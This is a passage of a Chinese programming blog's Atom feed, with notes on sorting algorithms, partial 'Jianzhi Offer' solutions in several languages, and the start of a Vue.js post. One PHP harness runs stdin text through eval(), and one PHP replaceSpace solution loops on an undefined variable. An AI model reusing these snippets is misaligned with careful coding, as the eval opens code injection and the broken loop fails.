                            i++; &lt;span style=&quot;color: #75715E;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;&amp;#20174;&amp;#24038;&amp;#24448;&amp;#21491;&amp;#25214;&amp;#31532;&amp;#19968;&amp;#20010;&amp;#22823;&amp;#20110; k &amp;#30340;&amp;#25968;&lt;/span&gt;
                    }
            }
            arr[i] = k;
            quick_sort(arr,left,i-1);
            quick_sort(arr,i+1,right);
    }
}
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;
&lt;b&gt;Java&lt;/b&gt;
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-java&quot;&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;
&lt;b&gt;PHP&lt;/b&gt;
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot;&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgc1d4b77&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgc1d4b77&quot;&gt;插入排序(InsertSort)&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-orgc1d4b77&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org9bbd847&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org9bbd847&quot;&gt;介绍(Instoduction)&lt;/h4&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org12c91e6&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org12c91e6&quot;&gt;伪代码(pseudo code)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-org12c91e6&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot;&gt;for j=2 to A.length
    key=A[j]&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
    //Insert A[j] into the sorted sequence A[1..j-1]
    i=j-1
    while i&amp;gt;0 and A[i]&amp;gt;key
         A[i+1]=A[i]
         i=i-1
    A[i+1]=key
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgecebd23&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgecebd23&quot;&gt;实现(realization)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-orgecebd23&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org1095f23&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org1095f23&quot;&gt;分而治之(divideand-conquer)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-org1095f23&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot;&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgf65ca3f&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgf65ca3f&quot;&gt;选择排序&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org2e73800&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org2e73800&quot;&gt;希尔排序&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgf7a5b53&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgf7a5b53&quot;&gt;归并排序&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orga1e3922&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orga1e3922&quot;&gt;基数排序&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org1340b5e&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org1340b5e&quot;&gt;堆排序&lt;/h3&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org789b68b&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org789b68b&quot;&gt;参考资料&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-org789b68b&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E7%BA%BF%E6%80%A7%E8%A1%A8&quot;&gt;线性表-维基百科&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.cnblogs.com/skywang12345/p/3603935.html&quot;&gt;数据结构与算法系列 目录&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="Data-Structure" /><category term="Algorithms" /><summary type="html">数据结构和算法目录 首先明确一点：程序=数据结构+算法</summary></entry><entry><title type="html">剑指 Offer</title><link href="http://localhost:4000/algorithms/2019/02/12/offer/" rel="alternate" type="text/html" title="剑指 Offer" /><published>2019-02-12T00:00:00+08:00</published><updated>2019-02-12T00:00:00+08:00</updated><id>http://localhost:4000/algorithms/2019/02/12/offer</id><content type="html" xml:base="http://localhost:4000/algorithms/2019/02/12/offer/">&lt;div id=&quot;outline-container-org6bd423d&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org6bd423d&quot;&gt;前言&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-org6bd423d&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;本文内容是《剑指 Offer》的问题求解整理，使其文档化，主要包括问题的代码编写（主流语言）和思路分析。&lt;/li&gt;
&lt;li&gt;文章结构按照10小题为一章节来划分，每一小题的编程语言的实现一般按照【低级语言》脚本语言》高级语言】的格式来展示。&lt;/li&gt;
&lt;li&gt;引用别人的一句话“我们不生产代码，我们是代码的搬运工”。&lt;/li&gt;
&lt;li&gt;文章内容仅供参考。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgc91e03a&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgc91e03a&quot;&gt;1~10&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-orgc91e03a&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;二维数组的查找
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
在一个二维数组中（每个一维数组的长度相同），每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-C++&quot; id=&quot;org45170b8&quot;&gt;
&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot; id=&quot;org7b30a49&quot;&gt;   &amp;lt;?php

function Find($target, $array)
{
    foreach($array as $key=&amp;gt;$val){
        if(in_array($target,$val)){
            return &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;true&quot;&lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
        }
    }
    return &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;false&quot;&lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
}
while(fscanf(STDIN,&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;%d,%s&quot;&lt;/span&gt;,$a,$b) == 2){
    $target = $a&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
    eval('$array='.$b.'&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;');&lt;/span&gt;
    try{
        echo Find($target,$array).&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;\n&quot;&lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
    }catch(Exception $e){
        die&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
    }
}
&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-java&quot; id=&quot;orga3e2849&quot;&gt;   &lt;span style=&quot;color: #F92672;&quot;&gt;public&lt;/span&gt; &lt;span style=&quot;color: #F92672;&quot;&gt;class&lt;/span&gt; &lt;span style=&quot;color: #66D9EF;&quot;&gt;Solution&lt;/span&gt; {
    &lt;span style=&quot;color: #F92672;&quot;&gt;public&lt;/span&gt; &lt;span style=&quot;color: #66D9EF;&quot;&gt;boolean&lt;/span&gt; &lt;span style=&quot;color: #A6E22E;&quot;&gt;Find&lt;/span&gt;(&lt;span style=&quot;color: #66D9EF;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #FD971F;&quot;&gt;target&lt;/span&gt;, &lt;span style=&quot;color: #66D9EF;&quot;&gt;int&lt;/span&gt; [][] &lt;span style=&quot;color: #FD971F;&quot;&gt;array&lt;/span&gt;) {
        &lt;span style=&quot;color: #66D9EF;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #FD971F;&quot;&gt;rows&lt;/span&gt; = array.length;
        &lt;span style=&quot;color: #66D9EF;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #FD971F;&quot;&gt;cols&lt;/span&gt; = array[0].length;
        &lt;span style=&quot;color: #66D9EF;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #FD971F;&quot;&gt;i&lt;/span&gt;=rows-1,&lt;span style=&quot;color: #FD971F;&quot;&gt;j&lt;/span&gt;=0;
        &lt;span style=&quot;color: #F92672;&quot;&gt;while&lt;/span&gt;(i&amp;gt;=0 &amp;amp;&amp;amp; j&amp;lt;&lt;span style=&quot;color: #66D9EF;&quot;&gt;cols&lt;/span&gt;){
            &lt;span style=&quot;color: #F92672;&quot;&gt;if&lt;/span&gt;(target&amp;lt;&lt;span style=&quot;color: #66D9EF;&quot;&gt;array&lt;/span&gt;[i][j])
                i--;
            &lt;span style=&quot;color: #F92672;&quot;&gt;else&lt;/span&gt; &lt;span style=&quot;color: #F92672;&quot;&gt;if&lt;/span&gt;(target&amp;gt;array[i][j])
                j++;
            &lt;span style=&quot;color: #F92672;&quot;&gt;else&lt;/span&gt;
                &lt;span style=&quot;color: #F92672;&quot;&gt;return&lt;/span&gt; &lt;span style=&quot;color: #AE81FF;&quot;&gt;true&lt;/span&gt;;
        }
        &lt;span style=&quot;color: #F92672;&quot;&gt;return&lt;/span&gt; &lt;span style=&quot;color: #AE81FF;&quot;&gt;false&lt;/span&gt;;
    }
}
&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-python&quot; id=&quot;org6c8ef40&quot;&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;-*- coding:utf-8 -*-&lt;/span&gt;
&lt;span style=&quot;color: #F92672;&quot;&gt;class&lt;/span&gt; &lt;span style=&quot;color: #66D9EF;&quot;&gt;Solution&lt;/span&gt;:
 &lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;array &amp;#20108;&amp;#32500;&amp;#21015;&amp;#34920;&lt;/span&gt;
 &lt;span style=&quot;color: #F92672;&quot;&gt;def&lt;/span&gt; &lt;span style=&quot;color: #A6E22E;&quot;&gt;Find&lt;/span&gt;(&lt;span style=&quot;color: #F92672;&quot;&gt;self&lt;/span&gt;, target, array):
     &lt;span style=&quot;color: #FD971F;&quot;&gt;rows&lt;/span&gt;=&lt;span style=&quot;color: #F92672;&quot;&gt;len&lt;/span&gt;(array)
     &lt;span style=&quot;color: #FD971F;&quot;&gt;cols&lt;/span&gt;=&lt;span style=&quot;color: #F92672;&quot;&gt;len&lt;/span&gt;(array[0])
     &lt;span style=&quot;color: #FD971F;&quot;&gt;i&lt;/span&gt;=rows-1
     &lt;span style=&quot;color: #FD971F;&quot;&gt;j&lt;/span&gt;=0
     &lt;span style=&quot;color: #F92672;&quot;&gt;while&lt;/span&gt; i&amp;gt;=0 &lt;span style=&quot;color: #F92672;&quot;&gt;and&lt;/span&gt; j&amp;lt;cols:
         &lt;span style=&quot;color: #F92672;&quot;&gt;if&lt;/span&gt; target&amp;lt;array[i][j]:
             &lt;span style=&quot;color: #FD971F;&quot;&gt;i&lt;/span&gt; -= 1
         &lt;span style=&quot;color: #F92672;&quot;&gt;elif&lt;/span&gt; target&amp;gt;array[i][j]:
             &lt;span style=&quot;color: #FD971F;&quot;&gt;j&lt;/span&gt; += 1
         &lt;span style=&quot;color: #F92672;&quot;&gt;else&lt;/span&gt;:
             &lt;span style=&quot;color: #F92672;&quot;&gt;return&lt;/span&gt; &lt;span style=&quot;color: #AE81FF;&quot;&gt;True&lt;/span&gt;
     &lt;span style=&quot;color: #F92672;&quot;&gt;return&lt;/span&gt; &lt;span style=&quot;color: #AE81FF;&quot;&gt;False&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot; id=&quot;org3bbac4f&quot;&gt;   class Solution
{
    public bool Find(int target, int[][] array)
    {
        int row=0&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
        int col=array[0].Length-1&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
        while(row&amp;lt;=array.Length-1&amp;amp;&amp;amp;col&amp;gt;=0){
            if(target==array[row][col])
                return true&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
            else if(target&amp;gt;array[row][col])
                row++&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
            else
                col--&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
        }
        return false&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;

    }
}
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;解题思路&lt;/b&gt;
矩阵是有序的，从左下角来看，向上数字递减，向右数字递增，因此从左下角开始查找，当要查找数字比左下角数字大时。右移要查找数字比左下角数字小时，上移。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;替换空格
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
请实现一个函数，将一个字符串中的每个空格替换成“%20”。例如，当字符串为We Are Happy.则经过替换之后的字符串为We%20Are%20Happy。
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot; id=&quot;org367b6d6&quot;&gt;   &amp;lt;?php
// &amp;#30452;&amp;#25509;&amp;#20351;&amp;#29992;&amp;#20989;&amp;#25968;
function replaceSpace($str)
{
    return str_replace(' ','%20',$str)&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
}
// &amp;#19981;&amp;#20801;&amp;#35768;&amp;#30452;&amp;#25509;&amp;#35843;&amp;#29992;&amp;#20869;&amp;#32622;&amp;#20989;&amp;#25968;
&amp;lt;?php
function replaceSpace($str)
{
    $res = ''&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
    $strLength = strlen($str)&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
    for($i=0&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;$i&amp;lt;$len;$i++){&lt;/span&gt;
        if($str[$i]==' '){
                $res .='%20'&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
        }else{
                $res .=$str[$i]&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
        }
    }
    return $res&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
}
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;解题思路&lt;/b&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;问题1：替换字符串，是在原来的字符串上做替换，还是新开辟一个字符串做替换！&lt;/li&gt;
&lt;li&gt;问题2：在当前字符串替换，怎么替换才更有效率（不考虑内置的replace方法）。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;从前往后替换，后面的字符要不断往后移动，要多次移动，所以效率低下&lt;/li&gt;
&lt;li&gt;从后往前，先计算需要多少空间，然后从后往前移动，则每个字符只为移动一次，这样效率更高一点。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;从尾到头打印链表
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
输入一个链表，按链表值从尾到头的顺序返回一个ArrayList。
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot; id=&quot;orgb94d688&quot;&gt;     &amp;lt;?php

/*class ListNode{
    var $val&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
    var $next = NULL&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
    function __construct($x){
        $this-&amp;gt;val = $x&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
    }
}*/
function printListFromTailToHead($head)
{
    $arrayList = []&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
    while($head !== null){
        $arrayList[]=$head-&amp;gt;val&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
        $head=$head-&amp;gt;next&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
    }
    return array_reverse($arrayList)&lt;span style=&quot;color: #75715E;&quot;&gt;;&lt;/span&gt;
}
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;解题思路&lt;/b&gt;
有三种思路，
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一就是利用栈先入后出的特性完成；&lt;/li&gt;
&lt;li&gt;第二就是存下来然后进行数组翻转；&lt;/li&gt;
&lt;li&gt;第三是利用递归。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;重建二叉树
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
输入某二叉树的前序遍历和中序遍历的结果，请重建出该二叉树。假设输入的前序遍历和中序遍历的结果中都不含重复的数字。例如输入前序遍历序列{1,2,4,7,3,5,6,8}和中序遍历序列{4,7,2,1,5,3,8,6}，则重建二叉树并返回。
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot; id=&quot;org68ecd45&quot;&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;解题思路&lt;/b&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org92e8ade&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org92e8ade&quot;&gt;11~20&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-org92e8ade&quot;&gt;
&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;outline-container-orgabbcdf9&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgabbcdf9&quot;&gt;21~30&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-orgabbcdf9&quot;&gt;
&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;b&gt;题目描述&lt;/b&gt;
&lt;b&gt;解题思路&lt;/b&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="剑指-Offer" /><summary type="html">前言 本文内容是《剑指 Offer》的问题求解整理，使其文档化，主要包括问题的代码编写（主流语言）和思路分析。 文章结构按照10小题为一章节来划分，每一小题的编程语言的实现一般按照【低级语言》脚本语言》高级语言】的格式来展示。 引用别人的一句话“我们不生产代码，我们是代码的搬运工”。 文章内容仅供参考。 1~10 二维数组的查找 题目描述 在一个二维数组中（每个一维数组的长度相同），每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。</summary></entry><entry><title type="html">Vue.js</title><link href="http://localhost:4000/javascript/2018/12/29/vuejs/" rel="alternate" type="text/html" title="Vue.js" /><published>2018-12-29T00:00:00+08:00</published><updated>2018-12-29T00:00:00+08:00</updated><id>http://localhost:4000/javascript/2018/12/29/vuejs</id><content type="html" xml:base="http://localhost:4000/javascript/2018/12/29/vuejs/">&lt;p&gt;
感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！
&lt;/p&gt;

&lt;div id=&quot;outline-container-org842323d&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org842323d&quot;&gt;Options/Data&lt;/h2&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org0c6d635&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org0c6d635&quot;&gt;Options/Lifecycle Hooks(生命周期勾子)&lt;/h2&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org2709316&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org2709316&quot;&gt;Options/DOM&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-org2709316&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org9de3796&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org9de3796&quot;&gt;render/template/el 优先级&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-org9de3796&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgf21b6b1&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgf21b6b1&quot;&gt;优先级-图示&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-orgf21b6b1&quot;&gt;
&lt;p&gt;
优先级从上到下：render&amp;lt;template&amp;lt;el
&lt;/p&gt;

&lt;div class=&quot;figure&quot;&gt;
&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/vue-level.png&quot; alt=&quot;vue-level.png&quot; /&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;outline-container-orgc39f0a2&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgc39f0a2&quot;&gt;优先级-示例&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-orgc39f0a2&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-html&quot; id=&quot;org14ebe30&quot;&gt;&amp;lt;&lt;span style=&quot;color: #A6E22E;&quot;&gt;div&lt;/span&gt; &lt;span style=&quot;color: #FD971F;&quot;&gt;class&lt;/span&gt;=&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;vapp-1&quot;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&quot;color: #A6E22E;&quot;&gt;div&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&quot;color: #A6E22E;&quot;&gt;div&lt;/span&gt; &lt;span style=&quot;color: #FD971F;&quot;&gt;class&lt;/span&gt;=&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;vapp-2&quot;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&quot;color: #A6E22E;&quot;&gt;div&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&quot;color: #A6E22E;&quot;&gt;div&lt;/span&gt; &lt;span style=&quot;color: #FD971F;&quot;&gt;class&lt;/span&gt;=&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;vapp-3&quot;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&quot;color: #A6E22E;&quot;&gt;div&lt;/span&gt;&amp;gt;
&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-javascript&quot; id=&quot;org03b82df&quot;&gt;&lt;span style=&quot;color: #F92672;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #66D9EF;&quot;&gt;Vue&lt;/span&gt;({
  el: &lt;span style=&quot;color: #E6DB74;&quot;&gt;'.vapp-1'&lt;/span&gt;,
  data: {
    info: &lt;span style=&quot;color: #E6DB74;&quot;&gt;'&amp;#36825;&amp;#26159;&amp;#36890;&amp;#36807;el&amp;#23646;&amp;#24615;&amp;#33719;&amp;#21462;&amp;#25346;&amp;#36733;&amp;#20803;&amp;#32032;&amp;#30340;outerHTML&amp;#26041;&amp;#24335;&amp;#28210;&amp;#26579;&amp;#12290;'&lt;/span&gt;
  },
  template: &lt;span style=&quot;color: #E6DB74;&quot;&gt;'&amp;lt;div&amp;gt;&amp;#36825;&amp;#26159;template&amp;#23646;&amp;#24615;&amp;#27169;&amp;#26495;&amp;#28210;&amp;#26579;&amp;#12290;&amp;lt;/div&amp;gt;'&lt;/span&gt;,
  &lt;span style=&quot;color: #A6E22E;&quot;&gt;render&lt;/span&gt;: &lt;span style=&quot;color: #F92672;&quot;&gt;function&lt;/span&gt;(&lt;span style=&quot;color: #FD971F;&quot;&gt;h&lt;/span&gt;){
    &lt;span style=&quot;color: #F92672;&quot;&gt;return&lt;/span&gt; h(&lt;span style=&quot;color: #E6DB74;&quot;&gt;'div'&lt;/span&gt;, {}, &lt;span style=&quot;color: #E6DB74;&quot;&gt;'&amp;#36825;&amp;#26159;render&amp;#23646;&amp;#24615;&amp;#26041;&amp;#24335;&amp;#28210;&amp;#26579;&amp;#12290;'&lt;/span&gt;)
  }
})
&lt;span style=&quot;color: #F92672;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #66D9EF;&quot;&gt;Vue&lt;/span&gt;({
  el: &lt;span style=&quot;color: #E6DB74;&quot;&gt;'.vapp-2'&lt;/span&gt;,
  data: {
